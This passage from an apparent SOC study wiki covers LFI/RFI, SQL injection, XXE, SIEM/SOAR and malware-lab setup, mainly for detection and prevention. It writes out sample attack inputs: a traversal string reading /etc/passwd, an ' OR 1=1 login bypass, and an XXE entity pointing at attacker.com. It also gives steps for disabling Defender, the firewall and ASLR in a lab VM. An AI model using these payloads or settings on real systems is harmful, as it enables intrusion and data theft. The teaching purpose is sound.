Procedures. This includes the whole MITRE ATT&amp;CK Matrix, which means all the steps taken by an adversary to achieve his goal, starting from Phishing attempts to persistence and data exfiltration.\nIf we can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back.\nIf you can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back. For, example if you could detect a Pass the Hash Attack using Windows Event Log Monitoring and remediate it, you would be able to find the compromised host very quickly and stop the lateral movement inside your network.\n\nNext: Cyber Kill Chain"},"SOC/RFI--and--LFI":{"title":"RFI & LFI","links":[],"tags":[],"content":"What is Local File Inclusion (LFI)?\nLocal File Inclusion (LFI), is the security vulnerability that occurs when a file is included without sanitizing the data obtained from a user. It differs from RFI because the file that is intended to be included is on the same web server that the web application is hosted on.\nWhat is Remote File Inclusion (RFI)?\nRemote File Inclusion (RFI) is a vulnerability that occurs when a file is included without sanitizing the data received from a user. It differs from LFI because the included file is hosted on another server.\nHow does LFI &amp; RFI work?\nLike most web application-based vulnerabilities, LFI and RFI have vulnerabilities caused by the failure to sanitize data received from a user.\nRFI and LFI vulnerabilities arise when data received from a user is used directly in the system or to include a file on a remote server.\nHow could data received from a user be exploited to include a file? Web applications have become very complex over time and unfortunately, any feature that is developed can be used for malicious purposes. For example, the language setting in web applications is used to include files based on data received from a user.\n\nIf we examine the piece of code in the image above, we can see that the desired website language is selected using the ‘language’ parameter received from the user.\nIn a normal situation, the web application will work as intended. For example, if “en” is entered as the “language” parameter, we will receive the file shown below.\n“website/en/home.php”\nHowever, if an attacker enters the payload below in the “language” parameter, the web application will unfortunately display the “/etc/passwd” file to the user.\nPayload: /../../../../../../../../../etc/passwd%00\n“website//../../../../../../../../../etc/passwd%00/home.php\n“../” is used to go to the parent directory. Since the attacker does not know what directory the web application is in, he tries to use “../” to access the “root” directory. Later he names the file “/etc/passwd” and allows it to be included in the web application. The end of the string will be “%0”. This way, the rest of the “/home.php” string will not be read by the web application.\nHow Attackers Use RFI &amp; LFI?\n\nExecuting code\nDisclosure of sensitive information\nDenial of Service\n\nHow to Prevent LFI &amp; RFI?\nThe most effective way to prevent RFI and LFI attacks is to make sure that all data received from a user is sanitized before it is used. Remember that client-based controls are easily bypassed. Therefore, you should always implement your controls on both the client and server sides.\nDetecting LFI &amp; RFI Attacks\nWe have already mentioned what attackers can achieve with RFI and LFI attacks. Since an organization can lose a lot of money if these vulnerabilities are exploited, we should be able to detect these attacks and take the necessary precautions.\nHow can we detect and prevent LFI and RFI attacks?\n\nWhen examining a web request from a user, examine all fields.\nLook for any special characters: Within the data received from users, look for notations such as ’/’, ., \\.\nBecome familiar with files commonly used in LFI attacks: In an LFI attack, the attacker reads the files on the server. Knowing the critical file names on the server will help you detect LFI attacks.\nLook for acronyms such as HTTP and HTTPS: In RFI attacks, the attacker injects the file into their own device and allows the file to run.\nTo host a file, attackers usually set up a small web server on their own device and display the file using an HTTP protocol. You should therefore look for notations such as ‘http’ and ‘https’ to help you detect RFI attacks.\n"},"SOC/Reconnaissance":{"title":"Reconnaissance","links":["SOC/OSINT","SOC/Email-Harvesting","SOC/Phishing"],"tags":[],"content":"Reconnaissance (MITRE Tactic TA0043) is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries.\nOSINT also falls underReconnaissance. The attacker needs to gather as much info on the victim as he can to determine the best path &amp; target for attack.\nAn attacker may use technique such as Email Harvesting to gather emails which he can later use for spearPhishing attacks.\nThe Arsenal\nSome commonly used tools for Reconnaissance:\n1. theHarvester \nother than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources \n2. Hunter.io\nthis is  an email hunting tool that will let you obtain contact information associated with the domain\n3. OSINT Framework\nOSINT Framework provides the collection of OSINT tools based on various categories"},"SOC/SIEM":{"title":"SIEM","links":[],"tags":[],"content":"What is SIEM?\nSIEM is a security solution that combines security information and event management, which involves real-time logging of events in an environment. The ultimate purpose of event logging is to detect security threats.\nOverall, SIEM products have a lot of features. They collect and filter data and provide alerts for suspicious events.\nExample alert: If someone on a Windows operating system tries to enter 20 incorrect passwords in 10 seconds, this is suspicious activity. It is unlikely that someone who has forgotten their password would try to re-enter it that many times in such a short period of time. So we create a SIEM rule/filter to detect such activity that exceeds the threshold. Based on this SIEM rule, an alert will be generated when such a situation occurs.\n\nSome popular SIEM solutions: IBM QRadar, ArcSight ESM, FortiSIEM, Splunk, etc."},"SOC/SOAR":{"title":"SOAR","links":["SOC/SOC","SOC/SIEM","IP-address","SOC/Hash"],"tags":[],"content":"SOAR (Security Orchestration Automation and Response)\nSOAR stands for Security Orchestration Automation and Response. It enables security products and tools in an environment to work together, streamlining the tasks of SOC team members. For example, it will automatically search VirusTotal for the source IP of a SIEM alert, reducing the workload of the SOC analyst.\nSome SOAR products commonly used in the industry:\n\n\nSplunk Phantom\n\n\nIBM Resilient\n\n\nLogsign\n\n\nDemisto\n\n\nThe image below shows what can be achieved with a SOAR solution.\n\nBenifits of SOAR\nSaves Time\nSOAR saves time with workflows that automate processes. Some common workflows are:\n\nIP address reputation control\nHash query\nScanning an acquired file in a sandbox environment\n…\n\nCentralization (A single platform for everything you need)\nIt allows us to use different security tools in your environment (sandbox, log management, 3rd party tools, etc.) by providing an all-in-one software. These tools are integrated into the SOAR solution and can be used on the same platform.\n\nPlaybooks\nWe can easily investigate SIEM alerts using playbooks created for different scenarios within SOAR. Even if we don’t know or remember all the procedures, we can perform an analysis by following the steps outlined in the playbooks\nIn addition, these playbooks help ensure that the entire SOC team is on the same page when performing their analysis. For example, all team members need to check IP reputation, so if one team member is not checking it and the others are, this is an undesirable situation. We can avoid this situation by adding this step to the playbook."},"SOC/SOC":{"title":"SOC","links":["SOC/Pyramid-of-Pain"],"tags":[],"content":"What is SOC?\nSecurity Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.\nResponsibilities of SOC\n\nNext: Pyramid of Pain"},"SOC/SQL-Injection":{"title":"SQL Injection","links":[],"tags":[],"content":"What is SQL Injection (SQLi)?\nSQL Injections are critical attack vectors in which a web application directly includes un-sanitized user-provided data in SQL queries.\n\nThe frameworks we use today to develop web applications have preventative mechanisms in place to protect against SQL Injection attacks. However, we still come across SQL injection vulnerabilities because sometimes raw SQL queries are used, sometimes the framework has an inherent SQL injection vulnerability, or the framework is not used properly.\nTypes of SQL Injections\nThere are 3 types of SQL Injection. These are: \n1. In-band SQLi (Classic SQLi)\nWhen an SQL query is sent and responded to on the same channel, we call this in-band SQLi. This is easier for attackers to exploit than other categories of SQLi.\n2. Inferential SQLi (Blind SQLi)\nSQL queries that receive a response that cannot be seen are called Inferential SQLi. They are also called “Blind SQLi” because the response cannot be seen.\n3. Out-of-band SQLi\nIf the response to an SQL query is communicated through another channel, this type of SQLi is called “out-of-band SQLi”. For example, if the attacker receives replies to the SQL queries via DNS, this is called out-of-band SQLi.\nHow Does SQL Injection Work?\nToday, most standard web applications receive data from a user and use that data to display specific content. The login page is where most SQL injection attacks occur. Let’s look at how SQL injections work through an example.\nA user is usually expected to enter their username and password on the login page. Then, on the other side, the web application will use this username and password information to create an SQL query like the one below:\n\nSELECT * FROM users WHERE username = ‘USERNAME’ AND password = ‘USER_PASSWORD’\n\nThe meaning of this SQL query is “Bring me all the information about the user from the user’s table whose name is USERNAME and whose password is USER_PASSWORD”. If the web application finds a matching user, it will authenticate the user, if it cannot find a user after executing the query, the login will fail.\n\nLet’s say your username is “john” and your password is “supersecretpassword”. When you enter this information and click the ‘Login’ button, the SQL query shown below will be queried and you will be able to log in because a match was found after the SQL query.\n\nSELECT * FROM users WHERE username = ‘john’ AND password = ‘supersecretpassword’\n\nSo what if we do not use this system as it was designed and we put an apostrophe (’) in the username field? The SQL query will look like this and the error will be excluded from the database because the query was incorrect.\n\nSELECT * FROM users WHERE username = ‘john’’ AND password = ‘supersecretpassword’\n\n\nOf course, an attacker would be pleased to get an error message, as they can manipulate the information in the error message to their advantage. It also shows that the attacker is on the right track. So what if the attacker enters a payload like the following in the username section?\n\n‘ OR 1=1 — -\n\nWhen the attacker submits the payload, the web application executes the following SQL query:\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1 — - AND password = ‘supersecretpassword’\n\nIn SQL, any characters after ”— -” are considered to be a comment line. So if we look at the query above, the characters after ”— -” mean nothing. So, for the sake of simplicity, let’s remove that part before we examine the SQL query further.\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1\n\nThe query above now looks like this “if the username is empty or 1=1”. It does not matter whether the username field is empty or not, because 1 is always equal to 1. So this query will always be true and will most likely call the first entry in the database. The attacker will be able to successfully enter the web application because there is a match.\nThis is a typical SQL injection attack. Of course, SQL injection attacks are not limited to this example, the attacker could use SQL to execute commands in the system using SQL commands such as xp_cmdshell.\nWhat Attackers Gain from SQL Injection Attacks\nTo understand why SQL injection attacks are so important, let’s take a look at what an SQL injection attack can do.\n\nAuthentication bypass\nCommand execution\nExfiltration of sensitive data\nCreating/Deleting/Updating database entries\n\nHow to Prevent SQL Injections\n\nUse a framework: Of course, just using a framework is not enough to prevent a SQL injection attack. However, it is still very important to use the framework according to the documentation.\nKeep your framework up to date: Keep your web application secure by following security updates according to the framework you use.\nAlways sanitize data received from a user: Never trust data received from a user. In addition, sanitize all data (such as headers, URLs, etc.), not just form data.\nAvoid the use of raw SQL queries: You may be in the habit of writing raw SQL queries, but you should take advantage of the security provided by the framework.\n\nDetecting SQL Injection Attacks\nSo how do we detect SQL injection attacks?\nThere is more than one answer to this question:\n\nWhen examining a web request, check all areas that come from the user: As SQL injection attacks are not limited to the form areas, you should also check the HTTP request headers such as the “User-Agent”.\nLook for SQL keywords: Look for words such as “INSERT”, “SELECT”, and “WHERE” in the data received from users.\nCheck any special characters: Look for apostrophes (’), dashes (-), or parentheses used in SQL or special characters commonly used in SQL attacks in the data received from the user.\nFamiliarize yourself with commonly used SQL injection payloads: Although SQL payloads change depending on the web application, attackers still use some common payloads to test for SQL injection vulnerabilities. If you are familiar with these payloads, you can easily detect SQL injection payloads. You can find some commonly used SQL injection payloads here.\n\nDetecting Automated SQL Injection Tools\nAttackers use many automated tools to detect SQL injection vulnerabilities. One of the well-known tools is Sqlmap. However, let’s look at the bigger picture rather than focusing on one particular tool.\nYou can use the following methods to detect SQL injection tools:\n\n\nLook at the User-Agent: Automated tools usually have their names and versions recorded. You can look at the User-Agent to detect these automated tools.\n\n\nCheck the frequency of requests: Automated tools are designed to send an estimated number of requests per second to test payloads as quickly as possible. A normal user might send 1 request per second, so looking at the number of requests per second will tell you if the requests are from an automated tool or not.\n\n\nLook at the content of the payload: Automated tools usually include their own names in their payloads. For example, an SQL injection payload sent by an automated tool might look like this: sqlmap’ OR 1=1\n\n\nIf the payload is complicated: This detection method may not always work, but based on my experience I could say that automated tools send more complicated payloads.\n\n\nA Detection Example\nWe have access logs of a web application that was the victim of a SQL injection attack.\nYou may not know what an access log is. In a nutshell, they are the access logs from the web server. These logs usually contain the source IP address, date, requested URL, HTTP method, user agent, and HTTP response code, and they are very useful for investigations.\n\n(SQL Injection Access Logs)\nWe have an access log in hand. What do we do now?\nFirst of all, if we look at the pages that were requested, we see that besides pages like “info.php”, which is quite readable, there are also requests for pages that are complex and contain symbols like %. We cannot say that requests for pages like this are malicious, but the fact that they are repeated many times is suspicious.\nNext, let’s talk about what the % symbols mean. When we request a page that contains special characters, these requests are not sent directly to the web server. Instead, our browsers perform a URL encoding (“Percent Encoding”) of the special characters and replace each special character with a string that starts with % and contains 2 hexadecimal characters. So the pages that contain the % symbol above are pages that contain special characters.\n\nNow that we understand what the % symbols mean, let’s revisit the access logs. If we look at the requests, we can easily see that there are readable words such as “UNION”, “SELECT”, “AND”, and “CHR” next to the % symbols. As these are specific words belonging to SQL, we can see that we are facing an SQL injection attack.\nTo protect our eyes, let’s make the investigation a bit easier :) You can search with the keywords ” Online URL Decoder” to find web applications that automatically decode URLs for you. To make it easier to read these access logs, we’ll get help from these web applications, so we don’t have to strain our eyes.\nPlease note this: It is not wise to upload something like access logs, which contain critical information, to a 3rd party web application. The access logs uploaded in this course have been prepared specifically for educational purposes; don’t make such a mistake in your professional life.\n\nWhen we decode the URL, we can see more clearly that this is a SQL injection attack. So what do we do now?\nWe are going to find any other information we can from these access logs.\n\nFirst, let’s look at the request times. All the SQL injection payloads were sent on “19/Feb/2022 11:09:24”. We can see that more than 50 requests were made in 1 second. The fact that so many requests were made in such a short period indicates that this is an automated attack. In addition, as we mentioned earlier when attackers do manual testing, they choose to test simple payloads first. But when we look at the access logs, we see that the payloads are very complicated. This shows that the attack could be automated.\nWas is successful?\nWe have confirmed that an SQL injection attack was performed and that it was performed with an automated tool. So we can finish our analysis, right?\nThere is one more step to take. We need to determine whether or not the attack was successful. You can determine whether a SQL injection attack has been successful by looking at the response, but in real life, you will almost never have access to the response. We can assume that all responses will be about the same size because the attack is on the same page and via the “id” variable, and estimate the success of the attack by looking at the size of the response.\nUnfortunately, the simple web server developed as an example cannot provide a reliable response size. Therefore, we cannot estimate whether the attack was successful by looking at this example. However, for correctly configured web servers, we can find the response size in the access logs. You can examine this area to see if there is a noticeable difference in response sizes. If there is a noticeable difference, then you can assume that the attack was successful. However, in this situation, it would be best to escalate this alert to a senior analyst."},"SOC/Setting-up-Malware-Analysis-Lab":{"title":"Setting up Malware Analysis Lab","links":["SOC/Malware-Analysis-Tools"],"tags":[],"content":"Creating a malware analysis lab\nInstalling Virtualization Software\nBefore installing a virtual operating system, we need to install one of the virtualization software that enables this.\nWhile there are some differences between them, any of the virtualization software will help us for our dynamic analysis. You can install one of the following virtualization software:\n\nVMware Workstation\nVMware Fusion (for macOS)\nOracle Virtualbox\n\nWe will use VMware Workstation virtualization software during the training and it is recommended for you to install it so that you can follow the training easily.\nYou can download and install VMware Workstation here.\nInstalling Operating System\nAfter installing the virtualization software on our system, let’s set up our operating system with the help of these virtualization software.\nIn order to install the operating system together with the virtualization software, we need to obtain the ISO files of the operating systems. You can use the application called MediaCreationTool published by Microsoft to create an ISO file for the Windows operating system.\nMalware may be programmed not to work or to behave differently depending on the operating system. For this reason, we strongly recommend that you have different operating systems at hand.\nWhen you run MediaCreationTool, you will be prompted with “Upgrade this PC now” and “Create installation media” options. Let’s continue by selecting the “Create installation media” option.\n\nThen we are asked to choose Language, operating system version information and operating system architecture. From here you can choose the Windows 10 64bit option. We recommend you to choose the operating system with 64bit architecture first. You can run both 32-bit applications and 64-bit applications on operating systems with 64-bit architecture, but you can only run 32-bit applications on operating systems with 32-bit architecture.\n\nAfter choosing the operating system version information and architecture, we are asked whether we want to write to the USB drive or create an ISO file. Since we need the ISO file, we choose the ISO option here.\n\nThen we are asked in which directory we want the ISO file to be saved. You may choose an appropriate directory for you.\nWhen you complete these steps, the ISO file will be saved in the directory you specified. (This step may take a long time.)\nNow that we have the ISO file, we can proceed to the installation of the operating system. Since VMware Workstation will be used in this training series, the lecture will be through this software. However, If you wish to use another virtualization software you should be able to adapt the lecture for other virtualization software easily since all these software are very similar.\nSince we are going to install a new operating system, we must first click on the “Create a New Virtual Machine” button. Alternatively, you can select “File” from the top menu and then “New Virtual Machine”.\n\nThen, we are asked to choose what kind of installation we want to proceed with. We continue our installation by choosing “Typical (recommended)”.\n\nWe select the ISO file that we have downloaded by selecting the “Installer disc image file (iso)” option.\n\nNext, we are asked to name the Virtual Machine and specify the directory that we want the files of the VM to be kept. You can use “Windows10 Dynamic Analysis” as the name and “the default directory” as the directory. We recommend giving it a descriptive name to your VM so that you won’t confuse your VMs if you have multiple. If you wish you can change this name you have given to the VM later.\n\nAfter choosing the name and the directory where the VM’s files will be kept, we are asked to determine the disk size of our operating system. Since we will install various software and applications in it, we recommend that you allocate a minimum of 60-70 GB.\n\nFinally, we are presented with some hardware settings that the operating system uses. At this stage, we go to the customization step by clicking the “Customize Hardware” button.\n\nSince we are using an operating system with a 64-bit architecture, I recommend reserving a minimum of 4 GB of RAM. If you assign lower settings you may end up with performance and operating system errors. However, if you are installing an operating system with a 32-bit architecture, then you may allocate less RAM.\n\nAfter we pass this stage, a Virtual Machine with the settings we specified is being created.\n\nAfter the VM is created, you can install the operating system normally by running the created VM.\nInstalling Tools and Software\nAt this point, our operating system is now ready for use. Next is the installation of tools and software that we will use during dynamic analysis.\nYou should install the tools we mentioned in our Malware Analysis Tools article on your virtual operating system now.\nTweaking Virtual Machine\nWe need to make some configuration changes on our Virtual Machine to be able to use it for malware analysis.\n1. Turn off anti-malware solutions\nSince we will analyze malware on our VM, we do not want antivirus software to delete the malware we have installed for analysis. We should turn off Windows Defender which comes active by default in Windows operating systems.\nYou should go to Windows Defender settings and disable all active settings. The feature that instantly scans and deletes the malware you have installed to analyze is “Real-time protection”. Make sure you turn this feature off.\n\nDisable Windows Defender Using Group Policy\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through “Search&gt;Run” function on Windows.\nTo disable Windows Defender using the Local Group Policy Editor application, you must access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Microsoft Defender Antivirus”\nHere, you should double-click the “Turn off Microsoft Defender Antivirus” policy and set it to “Enabled”.\n\nYou should also disable the “Monitor file and program activity on your computer” policy under “Real-time Protection”.\n\n2. Rename your virtual operating system\nSome malicious software makes various checks in order not to work in analysis environments. One of these checks is to check the hostname. Since most sandboxes have hostnames such as “Sandbox”, “Malware”, “Cuckoo” …, malware is programmed not to run on systems with these hostnames.\nYou should make your VM look like a normal user’s system as much as possible so that you can avoid anti-analysis techniques. Specifying a random name as the hostname will allow you to help avoid such checks.\nTo change the device name, you must select “Settings → System → About” and then click the “Rename this PC” button.\n\nDon’t forget to change your username too!\n3. Turn off auto updates\nThe malware we are going to analyze may be taking advantage of vulnerabilities in the operating system. In order for the malware to run as normally as possible, we need to turn off the automatic updates of our virtual operating system.\nYou can turn off automatic updates through the group policy settings.\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through the “Search&gt;Run” function on Windows.\nYou should then access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Update”\nAfter accessing the relevant policy, you should set the policy named “Configure Automatic Updates” to “Disabled”.\n\n4. Disable Hidden Extensions\nYou may have seen the attackers try to trick their victims by changing the file extensions. How could they do this?\nWindows operating systems are set to hide known file extensions by default. In other words, a file named “Chrome.exe” will appear as “Chrome” by default. Attackers name their malicious software as “Photo.jpg.exe”, causing the user to see the file as “Photo.jpg”. When the user thinks that this file is an image file and opens it, the malware will start to run.\nIn order not to get confused with this during our analysis, we need to fix it so that the extensions that are hidden by default are always shown.\nFor this, we need to open the application named “File Explorer” and access the settings menu by clicking the “File” and then “Change folder and search options” buttons from the top menu.\n\nThen you should save the settings by unchecking “Hide extensions for known file types” from the “View” tab.\n\n5. Show Hidden Files and Folders\nMalware aims to prevent the user from detecting their files by hiding them. By default, showing hidden files and directories will enable us to perform a more comfortable analysis.\nLet’s open the application called File Explorer and open the settings menu with the help of “File” from the top menu, then click “Change folder and search options”.\n\nThen, let’s check the “Show hidden files, folders, and drives” from the “View” tab and save the setting.\n\n6. Disable ASLR\nNew versions of Windows have an anti-exploit security mechanism called ASLR (Address Space Layout Randomization). We won’t get into ASLR too much in this training, but you may want to disable this feature at this stage as it will come up in the future.\nYou can disable this setting with the help of Registry. Access the following registry by opening the Registry Editor application.\n`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\n\nThen create a REG_DWORD type key named MoveImages.\nThese settings will eventually disable the ASLR feature.\n7. Disable Windows Firewall\nAs we implemented in the previous steps, we should disable the Windows Firewall to prevent the security mechanisms from interfering with the malicious software we analyze.\nAccess Windows Defender Firewall settings via the control panel. You can access these settings using the search bar in the top menu of File Explorer. If you copy and search the following path in this search bar, it will take you to the Windows Defender Firewall settings.\n“Control Panel\\System and Security\\Windows Defender Firewall\\Customize Settings”\n\nAfter accessing the Defender Firewall settings, select “Turn off Windows Defender Firewall” and save it. This will disable the Firewall.\n\n8. Mimic an End-User System\nYou should make your VM look like a normal end-user operating system as much as possible so that the malware you are analyzing is not caught by anti-analysis techniques.\nSince there are no precise instructions or settings for this, it’s totally up to you to make your analysis VM look like a normal end-user’s computer. We can recommend the following tips to implement on your VM to establish this similarity:\n\nInstalling browsers frequently preferred by end-users such as Chrome and Firefox,\nLeaving files in different directories that will be of interest to the attacker,\nChanging the desktop background,\nTo ensure that some files are found in the Downloads directory by downloading small applications through the browser\n\n9. Change Network Settings\nWe need to prevent our malware from spreading to different devices via network connection. Thanks to the private networks provided by virtualization software, we can prevent malware from infecting different devices.\nFor this, you must click on the “VM” menu in the top menu of VMware Workstation and select “Settings”.\nYou should select the “Custom” setting by selecting “Network Adapter” from the left menu in the window that opens.\n\nTake a Snapshot\nYour operating system may be affected functionally or become unusable after you analyze malware or ransomware on your system. When you want to analyze a new malware after running and analyzing another malware, you do not want your operating system to get affected by the changes that was made by the old malware you analyzed.\nIn such cases, you can take advantage of the Snapshot feature of virtualization software.\nSnapshot is a feature that allows you to take a snapshot of your Virtual Machine and return to this backup later.\nOur VM has been configured for malware analysis and the applications that we will be using in the analysis have been installed into it. At this stage, you can take a Snapshot and then switch to the same analysis environment with your clean VM.\nTo take snapshots, you can access the screen where you manage Snapshots by clicking the “VM” menu in the top menu of the VMware Workstation application and clicking “Snapshot” → “Snapshot Manager”.\nThen you can take a snapshot of your VM by clicking the “Take Snapshot” button. That’s how easy it is to take snapshots.\n\nEntering detailed information on the description will allow you to easily find the Snapshot you need. For this reason, we recommend that you enter as descriptive comments as possible."},"SOC/Static-Email-Analysis":{"title":"Static Email Analysis","links":["phishing","IP-address"],"tags":[],"content":"Many people find plain text boring, which is why email programs offer HTML support, allowing us to create emails that are more likely to grab the user’s attention. Of course, there is a downside to this feature. Attackers can use HTML to create emails that hide malicious URLs behind buttons or text that appear to be harmless.\n\nAs seen in the image above, the address the user sees when clicking on a link can be different (the real address is seen when the user hovers over the link).\nIn most phishing attacks, the attackers take a new domain address and complete a phishing attack within a few days. Therefore, if the domain name in the email is new, it is more likely to be a phishing attack.\nBy querying VirusTotal for web addresses in emails, we can find out if the antivirus engines detect the web address as harmful.\nPerforming a static analysis of the files in the email can provide insight into the capacity/capability of the file. However, since static analysis takes a long time, dynamic analysis can provide the information you need more quickly.\nCisco Talos Intelligence has search sections where we can learn the reputation of IP addresses. By looking up the SMTP address of the email we detected in Talos, we can see the reputation of the IP address and find out if it is on the blacklist. If the SMTP address is blacklisted, it can be assumed that the attack was carried out on a compromised server.\n\nSimilarly, the SMTP address can be searched on VirusTotal and AbuseIPDB to find out if the IP address has been involved in malicious activity in the past."},"SOC/Timestomping":{"title":"Timestomping","links":["SOC/Masquerading"],"tags":[],"content":"Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files and to revert modification date of file.\nTimestomping may be used along with file name Masquerading to hide malware and tools."},"SOC/Unified-Kill-Chain":{"title":"Unified Kill Chain","links":["SOC/Cyber-Kill-Chain","SOC/Reconnaissance","SOC/Gaining-Initial-Foothold","SOC/Network-Propagation","SOC/Adversary's-Objectives","SOC/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"The unified kill chain aims to complement (not compete with) other cybersecurity kill chain frameworks, such as The Cyber Kill Chain. It states that there are 18 phases to an attack: Everything from Reconnaissance to data exfiltration and understanding an attacker’s motive.\n\nThe unified kill chain can be divided into 3 categories:\nPhase: IN\nThis is the phase where adversary gains initial foothold in the system. It is described in detail in Gaining Initial Foothold page.\nPhase: THROUGH\nThis is the phase where the adversary moves through the network and gains access to the whole network. It is explained in detail in Network Propagation page.\nPhase: OUT\nThis is the stage where the adversary will execute their objective and end the process. This phase is explained in detail in Adversary’s Objectives page.\nNext: MITRE ATT&amp;CK Framework"},"SOC/Watering-Hole":{"title":"Watering Hole","links":[],"tags":[],"content":"A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker’s choice.\nThe attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending “harmless” emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension."},"SOC/Web-Attacks":{"title":"Web Attacks","links":["SOC/OWASP","SOC/How-Web-Applications-Work","SOC/SQL-Injection","SOC/XSS-Attack","SOC/Command-Injection","SOC/IDOR-Attack","SOC/Open-Redirection-Attack","SOC/Directory-Traversal-Attack","SOC/Brute-Force-Attack","SOC/XEE-Attack","SOC/Malware-Analysis"],"tags":[],"content":"What are Web attacks?\nBecause web applications serve as the interface to the internet for many organizations, they can be exploited by attackers to gain access to devices, steal personal data, or cause service disruptions, resulting in significant financial damage.\nA study found that 75% of all cyber-attacks are targeted at the web application level.\nIntroduction\n1. OWASP\n2. How Web Applications Work\nAttack Vectors\n1. SQL Injection\n2. XSS Attack\n3. Command Injection\n4. IDOR Attack\n5. Open Redirection Attack\n6. Directory Traversal Attack\n7. Brute Force Attack\n8. XEE Attack\nNext: Malware Analysis"},"SOC/Wireshark":{"title":"Wireshark","links":[],"tags":[],"content":"Tool used to analyze network traffic. The GOAT"},"SOC/XEE-Attack":{"title":"XEE Attack","links":[],"tags":[],"content":"What is XML External Entity?\nFor a better understanding let’s quickly look at what XML is.\nXML (Extensible Markup Language) is a markup language that is used for structuring and storing data in a structured format that is both human-readable and machine-readable. XML was developed as a successor to HTML (Hypertext Markup Language) and is widely used for data exchange between different systems and platforms, particularly on the web.\nXML uses a set of tags to define the structure and content of the data being represented. These tags are used to identify and describe various elements and attributes of the data, such as tags for opening and closing elements, attributes for specifying additional information about the element, and entities for representing special characters and symbols.\nOne of the key advantages of XML is its flexibility and extensibility. It is possible to define custom tags and schemas for representing data, making it a powerful tool for representing complex data structures and exchanging data between different systems.\nWhile XML was once widely used for a variety of purposes, its usage has declined in recent years as newer data formats like JSON have gained popularity with its simplicity, ease of use, and better support for modern web technologies.\nXXE (XML External Entity) vulnerability is a type of security vulnerability that affects applications that parse XML input. In an XXE attack, an attacker injects malicious XML data into an application that uses an XML parser without proper validation, which can result in the application processing external entities that can be controlled by the attacker.\nAn external entity is a piece of XML that is defined outside of the XML document, but can be referenced and included within the document. An attacker can exploit an XXE vulnerability to include malicious external entities that can read local files, access internal systems, or perform other malicious actions on the server.\nXXE vulnerabilities can be exploited in various ways, such as through web forms that accept XML input, SOAP and REST APIs that use XML-based payloads, or other applications that accept and process XML input. These attacks can lead to sensitive data leaks, server-side request forgery (SSRF), denial of service (DoS) attacks, and other serious security issues.\nIt is important for developers to be aware of XXE vulnerabilities and take steps to prevent them, such as disabling external entities, validating and sanitizing XML input, and using secure XML parsers that are specifically designed to prevent XXE attacks.\nXML External Entity Possible Vectors\nTo find XML External Entity (XXE) vulnerabilities in a web application, you can start by examining the application’s XML processing code to identify any input points that accept XML input. These input points could include:\n\nForm fields that accept XML input\nXML files uploaded by users\nAPIs that accept XML requests\nXML files used for configuration or other purposes\n\nOnce you have identified the input points that accept XML input, you can test them for XXE vulnerabilities by providing input that includes external entity references and observing the application’s response.\nYou can also use automated vulnerability scanners and penetration testing tools that can detect and exploit XXE vulnerabilities. These tools can send various payloads that include external entity references and observe the response to determine if the application is vulnerable.\nHow XML External Entity Works?\nXXE attacks can depend on the programming language used by the server-side application. The XXE attack vector exploits a vulnerability in the XML parser of the server-side application, and the specific vulnerabilities and defenses can vary depending on the programming language used.\nFor example, PHP has a built-in XML parser called DOMDocument that is often used in web applications. The parser can be vulnerable to XXE attacks if the XML input is not properly validated and sanitized, and external entities are not disabled. As a defense, developers can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP.\nHere’s an example of vulnerable PHP code that demonstrates an XXE vulnerability:\n\nIn this example, the PHP script accepts an XML input parameter named “xml” and uses the loadXML() method of the DOMDocument class to parse it into a DOMDocument object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this XML input, the attacker defines a new external entity called “xxe” that references the “/etc/passwd” file on the server. When the PHP script processes this input, it will load the “/etc/passwd” file and include its contents in the output, which can allow the attacker to read sensitive information from the server.\nTo prevent XXE attacks in PHP, it is important to validate and sanitize any XML input properly and disable the processing of external entities whenever possible. You can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP. Additionally, you can use input validation and sanitization functions such as filter_var() to ensure that the XML input is properly formatted and does not contain any malicious payloads.\nLet’s take a look at how XXE vulnerability appears in Java servlet applications;\n\nIn this example, the servlet accepts an XML input parameter named “xml” and uses a DocumentBuilder object to parse it into a Document object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this payload, we define an external entity xxe that points to a remote XML file attacker.com/xxe.xml. Then, we include the entity within the  element using the &amp;xxe; syntax.\nWhen the XML parser processes this payload, it will attempt to fetch the remote xxe.xml file specified in the xxe entity. If the server hosting the vulnerable application is vulnerable to SSRF, this can result in the attacker being able to access internal systems or perform other malicious actions on the server.\nImpact of XML External Entity\nThe impact of an XXE vulnerability can vary depending on the specific vulnerability and the context of the application. In general, however, an XXE vulnerability can be quite serious and can result in a range of harmful outcomes, including:\n\nInformation disclosure: An attacker can use an XXE vulnerability to access sensitive data from the server with read/write capability that will allow the attacker to modify/transfer the data, such as configuration files, user credentials, and other sensitive information.\nServer-side request forgery (SSRF): An attacker can use an XXE vulnerability to make requests 